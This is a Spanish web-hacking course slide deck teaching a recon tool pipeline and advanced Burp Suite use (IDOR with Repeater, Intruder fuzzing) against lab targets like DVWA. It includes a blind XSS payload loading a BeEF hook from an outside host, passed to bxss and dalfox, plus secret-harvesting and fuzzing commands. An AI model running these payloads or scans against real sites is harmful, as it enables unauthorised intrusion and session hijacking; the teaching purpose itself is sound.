# Deck — Clase 1 · Módulo 3

> Curso de Web Hacking
> Duración: ~1h40m (primera parte de la Clase 5, antes de la pausa)
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 3 — Clase 1
### Recon Activo + Burp Suite Avanzado

---

## Recap: clase pasada y Burp hasta ahora

**Clase pasada (Clase 4):** XSS reflected/stored/DOM, bypass de filtros, BeEF; después APIs modernas — BOLA, Mass Assignment, JWT (alg:none), File Upload→RCE, Metasploit.

**Burp, desde Módulo 2, Clase 2:**
- Burp como proxy interceptor (Man-in-the-Middle)
- Configuración: proxy en navegador + certificado CA
- **Proxy**: interceptar y modificar tráfico
- **Repeater**: reenviar requests manualmente
- **Intruder**: automatizar ataques (Sniper, Pitchfork, Cluster Bomb)
- **Target**: definir scope del análisis

> Hoy llevamos Burp al siguiente nivel: técnicas avanzadas de explotación manual.

---

## ¿Por qué "avanzado"?

Ya no nos limitamos a **interceptar** tráfico.

Ahora vamos a:
- **Descubrir superficie de ataque** con un pipeline de recon automatizado
- **Validar hipótesis** de seguridad con Repeater
- **Analizar controles de acceso** (IDOR, bypass de autorización)
- **Fuzzear masivamente** con Intruder lo que encontró el pipeline

**El objetivo:** No solo "encontrar vulnerabilidades", sino **entender el comportamiento del sistema**.

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **0** | Recon activo: pipeline de herramientas | ~45 min |
| 🧪 | Demo 0: pipeline completo sobre target | ~15 min |
| **1** | Usando Burp sobre lo que encontró el recon | ~10 min |
| 🧪 | Demo: IDOR con Repeater | ~15 min |
| **2** | Intruder: fuzzing masivo de candidatos | ~10 min |

---

## Recon Activo — Encontrar Superficie de Ataque

Antes de explotar, hay que **saber qué atacar**.

El recon activo con herramientas CLI permite:
- Descubrir **subdominios y hosts activos**
- Recolectar **URLs históricas y presentes**
- Filtrar parámetros con **patrones vulnerables**
- Detectar XSS y SQLi de forma **semi-automática**

> **Principio clave:** más superficie descubierta = más vectores potenciales.

---

## El Pipeline de Recon

```
subfinder  ──►  httpx-toolkit  (descubrir y filtrar hosts vivos)
                  │
          gau + katana          (recolectar URLs históricas + activas)
                  │
                uro              (deduplicar patrones)
                  │
     ffuf + gf + arjun          (fuzzing de rutas + filtrar params + descubrir ocultos)
                  │
    nuclei + kxss + bxss        (verificar vulnerabilidades)
                  │
            Burp Suite          (explotación y validación manual)
```

---

## subfinder — Enumeración de Subdominios

**¿Qué hace?** Encuentra subdominios de forma **pasiva** — sin tocar el target directamente.

```bash
# Básico
subfinder -d target.com -o subdomains.txt

# Con todas las fuentes disponibles
subfinder -d target.com -all -v -o subdomains.txt
```

**Output:**
```
api.target.com
admin.target.com
staging.target.com
dev.target.com
```

> Pasivo = consulta fuentes públicas (Shodan, VirusTotal, crt.sh, DNS). No genera tráfico al target.

---

## httpx-toolkit — ¿Cuáles responden?

**¿Qué hace?** Prueba cada subdominio y filtra los que responden HTTP/HTTPS.

> 📦 En Kali: el binario se llama `httpx-toolkit` (⚠️ `httpx` en Kali es el cliente Python, no ProjectDiscovery)

```bash
# Probe básico
cat subdomains.txt | httpx-toolkit -o live.txt          # Kali
cat subdomains.txt | httpx-toolkit -o live.txt             # Kali y Mac

# Con status code, título y tecnología detectada
cat subdomains.txt | httpx-toolkit -status-code -title -tech-detect -o live.txt
```

**Output:**
```
https://api.target.com       [200] [API Gateway]   [nginx]
https://admin.target.com     [302] [Admin Panel]   [apache]
https://staging.target.com   [200] [Staging]       [express]
```

> `httpx-toolkit` descarta hosts muertos y agrega contexto para **priorizar** qué atacar primero.

---

## gau + katana — Recolección de URLs

**gau** extrae URLs históricas desde Wayback Machine, Common Crawl y AlienVault.

```bash
gau target.com --threads 5 --o urls_historicas.txt
```

**katana** es un crawler activo — sigue links en tiempo real, descubre endpoints dinámicos.

```bash
# Crawl con profundidad 3
katana -u https://target.com -d 3 -o urls_activas.txt

# Con JS parsing (para SPAs)
katana -u https://target.com -jc -o urls_activas.txt
```

```bash
# Combinar ambas fuentes
cat urls_historicas.txt urls_activas.txt | sort -u > all_urls.txt
```

---

## jsleak — Secretos y Links en JS

**¿Qué hace?** Analiza archivos JavaScript en busca de endpoints ocultos y secretos/credenciales hardcodeadas.

```bash
# Extraer links + secrets de todos los JS encontrados por katana
cat katana.txt | jsleak -l -s

# Solo endpoints
cat katana.txt | jsleak -l -c 20

# Solo secrets (API keys, tokens, passwords)
cat katana.txt | jsleak -s

# Contra un archivo JS específico
echo "https://target.com/main.js" | jsleak -l -s
```

**Output típico:**
```
[LINK]   /api/v1/users
[LINK]   /rest/products/search
[SECRET] apiKey: "AIzaSyD..."
[SECRET] password: "admin123"
```

> Combinar con katana: `katana -u target.com -jc -silent | jsleak -l -s`

---

## uro — Deduplicación de URLs

**El problema:** gau + katana generan miles de URLs con el mismo patrón:

```
/product?id=1
/product?id=2
/product?id=3   ← mismo parámetro, valor distinto → ruido puro
```

**uro** filtra dejando un solo representante por patrón:

```bash
cat all_urls.txt | uro -o urls_clean.txt
```

**Resultado:** de 10,000 URLs → ~500 patrones únicos.

> Solo necesitás **un representante por patrón** para testear el parámetro. El resto es ruido.

---

## gf — Filtrado por Patrones Vulnerables

**gf** aplica patrones grep sobre URLs para clasificar posibles vulnerabilidades.

```bash
# XSS — parámetros típicos: q=, search=, input=, redirect=
cat urls_clean.txt | gf xss > candidates_xss.txt

# SQLi — parámetros típicos: id=, user=, cat=, page=
cat urls_clean.txt | gf sqli > candidates_sqli.txt

# Open redirect
cat urls_clean.txt | gf redirect > candidates_redirect.txt

# SSRF, RCE, LFI
cat urls_clean.txt | gf ssrf > candidates_ssrf.txt
cat urls_clean.txt | gf rce  > candidates_rce.txt
cat urls_clean.txt | gf lfi  > candidates_lfi.txt
```

> gf **no confirma** vulnerabilidades — **prioriza** qué revisar primero.

---

## arjun — Parámetros Ocultos

**El problema:** muchos endpoints tienen parámetros no documentados que no aparecen en las URLs:

```
GET /search          ← ¿existe ?debug= ?admin= ?format= ?callback= ?
```

**arjun** los descubre por fuerza bruta inteligente:

```bash
# Un endpoint específico
arjun -u https://target.com/search

# Múltiples endpoints
arjun -i candidates_xss.txt --rate-limit 10 -o params_found.txt
```

**Output:**
```
[+] https://target.com/search
    | debug
    | format
    | callback
```

> Parámetros ocultos = superficie de ataque **no auditada** por otros scanners.

---

## ffuf — Fuzzing de Directorios y Parámetros

**Fuzz Faster U Fool** — el fuzzer más rápido del ecosistema Go.

```bash
# Directory/file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filtrar respuestas vacías (ignorar 404)
ffuf -u https://target.com/FUZZ -w common.txt -fc 404

# Fuzzing de parámetros GET
ffuf -u https://target.com/search?FUZZ=test -w params.txt -mc 200

# Fuzzing de valor de parámetro
ffuf -u https://target.com/user?id=FUZZ -w ids.txt -fc 404

# Virtual host discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200
```

| Modo | Uso |
|---|---|
| **Path fuzzing** | Descubrir rutas ocultas (`/admin`, `/backup`, `/api/v2`) |
| **Param fuzzing** | Encontrar parámetros que cambian el comportamiento |
| **Value fuzzing** | IDOR, SQLi, LFI sobre un parámetro conocido |
| **VHost fuzzing** | Subdominios no publicados en DNS |

> Wordlists recomendadas: `SecLists/Discovery/` (Daniel Miessler)

---

## kxss + bxss — Detección de XSS

**kxss** detecta qué parámetros **reflejan** caracteres especiales sin sanitizar.

```bash
cat candidates_xss.txt | kxss
```

**Output:**
```
[XSS] https://target.com/search?q=FUZZ   chars reflejados: < > " '
```

**bxss** inyecta payloads de **Blind XSS** — para XSS que se ejecutan en paneles admin invisibles.

```bash
cat candidates_xss.txt | bxss \
  -payload '"><script src=https://beef.labs.manuel-roldan.cloud/hook.js><\/script>' \
  -parameters
```

| Herramienta | Tipo de XSS detectado |
|---|---|
| **kxss** | Reflected (reflexión inmediata) |
| **bxss** | Blind (se ejecuta fuera de tu vista) |

---

## Gxss — Reflexión en Contextos JavaScript

**Gxss** detecta XSS reflejado con foco en **contextos JS** — más preciso que kxss para apps modernas.

```bash
# Parámetro individual
echo "https://target.com/search?q=test" | Gxss -p q

# Desde lista de URLs
cat candidates_xss.txt | Gxss -p q,search,input

# Con threads
cat candidates_xss.txt | Gxss -p q -c 50
```

**¿Por qué usarlo además de kxss?**

| | kxss | Gxss |
|---|---|---|
| **Detecta** | Caracteres reflejados sin encode | Reflexión dentro de contexto JS |
| **Mejor para** | HTML clásico | SPAs, apps con JS |
| **Output** | URL + chars | URL + contexto exacto |

```bash
# Pipeline: kxss para filtrado inicial → Gxss para validar contexto
cat urls.txt | kxss | grep "FUZZ" | Gxss -p q
```

---

## dalfox — XSS Scanner Automatizado

**dalfox** es el scanner de XSS más completo del ecosistema Go. Analiza, genera payloads y explota.

```bash
# Scan básico de una URL
dalfox url "https://target.com/search?q=test"

# Desde lista de URLs
dalfox file candidates_xss.txt

# Con Blind XSS (BeEF hook)
dalfox url "https://target.com/search?q=test" \
  --blind https://beef.labs.manuel-roldan.cloud/hook.js

# Solo parámetros específicos
dalfox url "https://target.com/page?id=1&q=test" -p q

# Output silencioso (solo hallazgos)
dalfox file urls.txt --silence
```

**Ventajas sobre kxss/Gxss:**
- Genera y **verifica** payloads automáticamente
- Detecta **DOM XSS** con headless Chrome
- Integra con **BeEF** para Blind XSS
- Reportes en JSON: `--format json -o results.json`

> dalfox confirma la vulnerabilidad, no solo detecta reflexión.

---

## nuclei — Escaneo con Templates

**nuclei** ejecuta templates de vulnerabilidades conocidas contra una lista de hosts.

```bash
# Templates básicos
nuclei -l live.txt -t exposures/ -t vulnerabilities/ -o results.txt

# Solo severidad alta/crítica
nuclei -l live.txt -severity high,critical -o critical.txt

# XSS y SQLi específicamente
nuclei -l live.txt -tags xss,sqli -o xss_sqli.txt
```

**¿Qué detecta?**
- Paneles expuestos (admin, phpMyAdmin, Jenkins, Grafana)
- CVEs conocidos
- Configuraciones inseguras
- XSS y SQLi con templates específicos

> nuclei es rápido pero genera **falsos positivos**. Siempre validar con Burp.

---

## 🧪 Demo 0 — Pipeline Completo

**Target:** `dvwa.labs.manuel-roldan.cloud`

**Importante:** DVWA tiene login. Sin sesión autenticada, el crawler solo ve `/login.php` — hay que loguearse primero y pasarle la cookie a `katana` con `-H`:

```bash
# Login manual en el browser → copiar cookie de sesión → pasarla al pipeline
katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 \
  -H "Cookie: security=low; PHPSESSID=<tu_session_id>" -o urls.txt
```

Con eso ya ves las páginas reales de `/vulnerabilities/*`, no solo el login.

```bash
# 1. Crawl del target
katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 -o urls.txt

# 2. Deduplicar
cat urls.txt | uro -o clean.txt

# 3. Filtrar candidatos
cat clean.txt | gf xss  > xss.txt
cat clean.txt | gf sqli > sqli.txt

# 4. Detectar reflexión XSS
cat xss.txt | kxss

# 5. Buscar parámetros ocultos
arjun -i clean.txt --rate-limit 5 -o params.txt

# 6. Escanear con nuclei
nuclei -l clean.txt -tags xss,sqli -severity medium,high
```

**Resultado:** lista priorizada de candidatos → exportar a Burp para explotación manual.

---

## Usando Burp sobre lo que encontró el Recon

Ya tenés Burp básico de **Módulo 2, Clase 2** (Proxy, Repeater, Intruder). Ahora lo usás sobre lo que **encontró el pipeline de recon**.

| Output del pipeline | Acción en Burp |
|---|---|
| URLs con parámetros (gf) | Importar a **Target → Site Map** |
| Parámetros ocultos (arjun) | Agregar a requests en **Repeater** |
| Candidatos XSS (kxss/dalfox) | Confirmar y explotar con **Repeater** |
| Lista de hosts (httpx-toolkit) | Definir **Scope** en Target |
| Candidatos SQLi / rutas (gf, ffuf) | Fuzzear con **Intruder** |

**La clave:** la autenticación **no implica** autorización — el servidor debe validar cada acción solicitada, no solo quién la pide.

---

## 🧪 Demo guiada — IDOR con Repeater

**Target:** WebGoat → Access Control Flaws → Insecure Direct Object References

**Escenario:** Una aplicación permite ver perfiles de usuarios mediante `GET /profile?id=123`

**Pasos:**
1. Interceptar la request válida (tu propio perfil)
2. Send to Repeater
3. Modificar el parámetro `id` a valores diferentes (121, 122, 124, etc.)
4. Comparar respuestas:
   - ¿Cambia el contenido?
   - ¿Ves datos de otro usuario?
   - ¿Hay diferencias en el código HTTP?
5. Documentar el IDOR si existe

**Objetivo:** Confirmar si el servidor valida autorización o confía en el parámetro.

---

## Intruder: Fuzzing Masivo de lo que Encontró el Recon

Repeater valida **una hipótesis a la vez**. Intruder automatiza eso contra **muchos valores**: los parámetros ocultos que descubrió `arjun` o las rutas/valores que encontró `ffuf`.

**Flujo:**
1. Send to Intruder sobre la request objetivo
2. Marcar el parámetro a fuzzear: `id=§123§`, `price=§1000§`
3. Cargar payloads (lista de IDs, rango numérico, wordlist)
4. Ejecutar y comparar resultados

| Indicador | Qué sugiere |
|-----------|-------------|
| Cambios en código HTTP | 200 vs 401 vs 403 → comportamiento distinto |
| Diferencias en tamaño de respuesta | Contenido distinto devuelto |
| Mensajes de error | Stack traces, errores SQL |
| Contenido inesperado | Datos de otro usuario, info de debug |

> Lo que Intruder marca como sospechoso se **confirma manualmente con Repeater**.

---

## Resumen de lo aprendido

- **Pipeline de recon**: subfinder → httpx-toolkit → gau+katana → uro → ffuf/gf/arjun → nuclei/kxss/bxss/Gxss/dalfox
- **Conectar recon con Burp**: usar los hallazgos del pipeline como input de Repeater e Intruder
- **Repeater**: validar hipótesis de control de acceso (IDOR) sobre requests concretas
- **Intruder**: fuzzing masivo de parámetros/IDs descubiertos por arjun y ffuf
- **Indicadores de hallazgos**: códigos HTTP, tamaños de respuesta, errores, contenido inesperado

---

## Próxima clase

Después de la pausa, misma clase: **defensa**. Cómo se mitiga cada cosa que acabamos de ver — SSDLC, headers, prepared statements, WAF, JWT seguro, y cierre del curso.

---

## Gracias

**¿Preguntas?**

Recuerden: Burp no es un botón mágico.
Es una herramienta que **amplifica** tu razonamiento.

Practiquen, experimenten, rompan cosas (en labs autorizados 😉)

---

## Pausa — 20 minutos

Volvemos en 20 minutos. Después: defensa y cierre del curso.
